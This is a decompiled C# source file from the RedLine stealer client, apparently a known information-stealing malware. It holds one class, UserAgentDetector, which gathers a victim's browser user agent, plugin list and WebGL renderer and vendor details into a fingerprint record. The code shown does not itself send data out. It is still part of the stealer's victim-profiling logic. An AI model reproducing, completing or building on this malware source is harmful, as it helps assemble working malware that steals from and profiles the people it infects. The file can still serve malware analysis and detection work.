using System;
using RedLine.Client.Models;

namespace RedLine.Client.Logic.Others
{
	// Token: 0x02000043 RID: 67
	public static class UserAgentDetector
	{
		// Token: 0x060001A2 RID: 418 RVA: 0x00005D18 File Offset: 0x00003F18
		public static FingerPrint GetFingerPrint()
		{
			try
			{
				UserAgentDetector._fingerPrint = default(FingerPrint);
				UserAgentDetector._fingerPrint.UserAgent = UserAgent.GetUserAgents()[0];
			}
			catch (Exception)
			{
			}
			UserAgentDetector._fingerPrint.UserAgent = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.UserAgent) ? "UNKNOWN" : UserAgentDetector._fingerPrint.UserAgent);
			UserAgentDetector._fingerPrint.Plugins = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.Plugins) ? "UNKNOWN" : UserAgentDetector._fingerPrint.Plugins);
			UserAgentDetector._fingerPrint.WebBaseGlRenderer = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.WebBaseGlRenderer) ? "UNKNOWN" : UserAgentDetector._fingerPrint.WebBaseGlRenderer);
			UserAgentDetector._fingerPrint.WebBaseGlVendor = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.WebBaseGlVendor) ? "UNKNOWN" : UserAgentDetector._fingerPrint.WebBaseGlVendor);
			UserAgentDetector._fingerPrint.WebBaseGlVersion = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.WebBaseGlVersion) ? "UNKNOWN" : UserAgentDetector._fingerPrint.WebBaseGlVersion);
			UserAgentDetector._fingerPrint.WebDebugGlRenderer = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.WebDebugGlRenderer) ? "UNKNOWN" : UserAgentDetector._fingerPrint.WebDebugGlRenderer);
			UserAgentDetector._fingerPrint.WebDebugGlVendor = Uri.UnescapeDataString(string.IsNullOrWhiteSpace(UserAgentDetector._fingerPrint.WebDebugGlVendor) ? "UNKNOWN" : UserAgentDetector._fingerPrint.WebDebugGlVendor);
			return UserAgentDetector._fingerPrint;
		}

		// Token: 0x040000EC RID: 236
		private static FingerPrint _fingerPrint;
	}
}
